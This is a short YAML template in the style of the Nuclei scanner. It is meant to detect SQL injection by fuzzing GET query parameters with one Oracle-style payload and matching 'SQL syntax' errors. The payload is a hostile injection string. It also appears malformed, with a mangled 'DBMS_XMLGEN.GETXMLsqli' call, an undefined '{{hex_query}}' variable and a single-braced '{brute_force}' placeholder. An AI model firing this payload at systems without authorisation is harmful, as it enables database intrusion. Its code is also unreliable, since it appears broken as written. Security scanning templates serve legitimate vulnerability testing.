id: fuzz-sqli-custom

info:
  name: Custom SQL Injection Detection
  author: netbaan
  severity: high
  description: |
    This template is designed to detect SQL injection vulnerabilities using a specified payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      sqli:
        - "1 or REGEXP_LIKE(DBMS_XMLGEN.GETXMLsqli(utl_raw.cast_to_varchar2(HEXTORAW(\\'{{hex_query}}\\')),\\'>{brute_force}(.+)?@<\\',\\'i\\'))"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "SQL syntax"

      - type: status
        status:
          - 500
          - 400